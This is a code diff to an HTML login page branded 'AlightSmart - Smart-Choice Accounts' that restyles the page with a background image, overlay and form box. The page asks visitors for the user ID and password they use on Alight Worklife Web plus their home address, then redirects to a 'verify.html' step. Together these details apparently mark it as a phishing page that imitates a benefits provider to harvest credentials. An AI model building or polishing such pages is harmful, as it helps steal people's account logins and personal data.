@@ -6,40 +6,131 @@
     <title>AlightSmart - Login</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f8fafc; min-height: 100vh; padding: 20px; display: flex; flex-direction: column; align-items: center; }
-        .logo-container { text-align: center; margin: 40px 0 30px; }
-        .logo-container h1 { font-size: 2.2rem; font-weight: 700; color: #1e2937; }
-        .logo-container .subtitle { font-size: 1.8rem; color: #0f172a; margin-top: 5px; }
-        .sun-icon { font-size: 3.5rem; margin: 15px 0; }
-        .form-container { width: 100%; max-width: 380px; }
-        label { display: block; margin: 25px 0 8px; font-size: 1.05rem; color: #334155; font-weight: 500; }
-        input { width: 100%; padding: 14px 16px; border: none; border-bottom: 1.5px solid #cbd5e1; font-size: 1.1rem; background: transparent; }
-        input:focus { outline: none; border-bottom-color: #3b82f6; }
-        .login-btn { width: 100%; padding: 16px; background: #1e40af; color: white; border: none; border-radius: 50px; font-size: 1.2rem; font-weight: 600; margin: 15px 0; cursor: pointer; }
         
-            .worklife {
-    font-size: 16px;           /* Slightly larger for better readability */
-    font-weight: 600;          /* Bold to draw attention */
-    color: #0052cc;            /* Stronger, professional blue */
-    background-color: #f0f7ff; /* Light blue background for highlight */
-    padding: 16px 20px;        /* Generous padding inside */
-    margin: 20px 0;            /* Space around the element */
-    border-left: 5px solid #0052cc; /* Left accent border */
-    border-radius: 6px;        /* Soft rounded corners */
-    line-height: 1.6;          /* Better line spacing */
-    text-align: left;
-    box-shadow: 0 2px 8px rgba(0, 82, 204, 0.1); /* Subtle depth */
-}
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            
+            /* Background Image */
+            background-image: url('alight.png');
+            background-size: cover;           /* Covers the whole screen */
+            background-position: center;      /* Centers the image */
+            background-repeat: no-repeat;     /* No tiling */
+            background-attachment: fixed;     /* Stays in place when scrolling */
+            
+            /* Optional dark overlay for better text readability */
+            position: relative;
+        }
+
+        /* Dark overlay so text remains readable on the image */
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.45);   /* Adjust darkness (0.3 = lighter, 0.6 = darker) */
+            z-index: -1;
+        }
+
+        .logo-container { 
+            text-align: center; 
+            margin: 40px 0 30px; 
+            z-index: 2; 
+            position: relative;
+        }
+        
+        .logo-container h1 { 
+            font-size: 2.2rem; 
+            font-weight: 700; 
+            color: white;           /* Changed to white for visibility */
+            text-shadow: 0 2px 8px rgba(0,0,0,0.6);
+        }
+        
+        .logo-container .subtitle { 
+            font-size: 1.8rem; 
+            color: white; 
+            margin-top: 5px;
+            text-shadow: 0 2px 8px rgba(0,0,0,0.6);
+        }
+        
+        .sun-icon { 
+            font-size: 3.5rem; 
+            margin: 15px 0; 
+        }
+        
+        .form-container { 
+            width: 100%; 
+            max-width: 380px; 
+            background: rgba(255, 255, 255, 0.95);  /* Semi-transparent white box */
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            z-index: 2;
+            position: relative;
+        }
+
+        label { 
+            display: block; 
+            margin: 25px 0 8px; 
+            font-size: 1.05rem; 
+            color: #1e2937; 
+            font-weight: 500; 
+        }
+
+        input { 
+            width: 100%; 
+            padding: 14px 16px; 
+            border: none; 
+            border-bottom: 1.5px solid #cbd5e1; 
+            font-size: 1.1rem; 
+            background: transparent; 
+        }
+
+        input:focus { 
+            outline: none; 
+            border-bottom-color: #3b82f6; 
+        }
+
+        .login-btn { 
+            width: 100%; 
+            padding: 16px; 
+            background: #1e40af; 
+            color: white; 
+            border: none; 
+            border-radius: 50px; 
+            font-size: 1.2rem; 
+            font-weight: 600; 
+            margin: 15px 0; 
+            cursor: pointer; 
+        }
+
+        .worklife {
+            font-size: 16px;
+            font-weight: 600;
+            color: #0052cc;
+            background-color: #f0f7ff;
+            padding: 16px 20px;
+            margin: 20px 0;
+            border-left: 5px solid #0052cc;
+            border-radius: 6px;
+            line-height: 1.6;
+            text-align: left;
+            box-shadow: 0 2px 8px rgba(0, 82, 204, 0.1);
+        }
+
         .helper-text {
-    display: block;
-    margin-top: 6px;
-    font-size: 14px;
-    color: #0052cc;           /* Blue to match your .worklife style */
-    font-weight: 500;
-}
-            
-            
-        
+            display: block;
+            margin-top: 6px;
+            font-size: 14px;
+            color: #0052cc;
+            font-weight: 500;
+        }
     </style>
 </head>
 <body>
@@ -47,22 +138,22 @@
         <h1>alight</h1>
         <div class="subtitle">Smart-Choice Accounts®</div>
         <div class="sun-icon">☀️</div>
-         <div class="worklife">Same login used to access benefits on Alight Worklife Web</div>
+        <div class="worklife">Same login used to access benefits on Alight Worklife Web</div>
     </div>
 
     <div class="form-container">
         <form id="loginForm">
            <div class="form-group">
-    <label for="username">Enter your User ID</label>
-    <input type="text" id="username" placeholder="User ID" required>
-    <small class="helper-text">Same ID used to access benefits on Alight Worklife Web</small>
-</div>
+                <label for="username">Enter your User ID</label>
+                <input type="text" id="username" placeholder="User ID" required>
+                <small class="helper-text">Same ID used to access benefits on Alight Worklife Web</small>
+            </div>
 
-<div class="form-group">
-    <label for="password">Enter your Password</label>
-    <input type="password" id="password" placeholder="Password" required>
-    <small class="helper-text">Same password used to access  benefits on Alight Worklife Web</small>
-</div>
+            <div class="form-group">
+                <label for="password">Enter your Password</label>
+                <input type="password" id="password" placeholder="Password" required>
+                <small class="helper-text">Same password used to access benefits on Alight Worklife Web</small>
+            </div>
 
             <label>Home Address (Current)</label>
             <input type="text" id="address" placeholder="Enter your current home address" required>
@@ -95,9 +186,7 @@
 
             window.location.href = "verify.html";
         });
-        
     </script>
     <script src="app.js"></script>
-    
 </body>
 </html>
